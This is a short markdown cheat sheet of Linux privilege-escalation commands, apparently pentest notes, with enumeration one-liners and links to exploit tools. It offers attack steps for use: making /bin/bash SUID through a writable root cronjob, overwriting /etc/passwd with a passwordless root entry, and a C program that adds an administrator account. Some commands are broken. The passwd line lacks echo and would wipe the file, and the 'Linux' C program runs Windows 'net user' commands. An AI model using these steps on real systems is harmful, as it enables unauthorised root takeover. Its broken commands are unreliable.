## Good Reads
```
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://github.com/janithmalinga/PayloadsAllTheThings
https://book.hacktricks.xyz/linux-unix/privilege-escalation
```
## Manual Enumeration

## Enumerate User Info

### Logged in user
```
id
whoami
pwd
```

### Find OS version
```
cat /etc/*-release
uname -a
lsb_release -a
```

### Other users
```
cat /etc/passwd
grep -vE "nologin|false" /etc/passwd
```
### curently running processes
```
ps aux
```
### What's installed
```
dpkg -l (Debian based OSs)
rpm -qa (CentOS / openSUSE )
uname -a
```

## Enumerate Network

### Find IP and associated IPs
```
ifconfig
ip a
```

### Open Ports
```
netstat -ano
```

## In privilage escalation we need to find answers first to below questions
```
What user files do we have access to?
What configurations do we have access to?
Any incorrect file permissions?
What programs are custom? Any SUID? SGID?
What's scheduled to run?
Any hardcoded credentials? Where are credentials kept?
```

## Automated Enumeration
```
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
```

## User editable cronjobs
```
crontab -l
```

## Application based cron jobs
```
ls -all /etc/cron.d
```
## if you find a cronjob running as root but can be editable run this command
```
chmod u+s /bin/bash
and then this,
/bin/bash -p
```

## Writable /etc/passwd file found
```
“root::0:0:root:/root:/bin/bash” > /etc/passwd
```

## Try dirty cow exploit
```
https://github.com/FireFart/dirtycow/blob/master/dirty.c
```

## SUID checker
```
find / \( -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
```

## If it is possible to run a c executable, run useradd.c file
```
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user janith janith@123 /add && net localgroup administrators janith /add");
  return 0;
}
```
